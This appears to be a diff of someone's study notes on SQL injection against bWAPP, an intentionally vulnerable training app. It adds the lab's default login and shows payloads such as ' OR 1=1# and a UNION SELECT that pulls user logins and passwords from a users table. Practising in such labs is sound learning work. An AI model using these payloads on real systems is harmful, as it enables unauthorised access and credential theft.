@@ -1,3 +1,7 @@
+bwapp
+username bee
+password bug
+
 ' OR  1=1#
     Display all data
 
@@ -71,5 +75,6 @@ output:-print all the column from table name user
 
 9)' and 1=0 union select 1,id,login,4,password,6,7 from users# 
 output:-displays user name with password
+
 
 
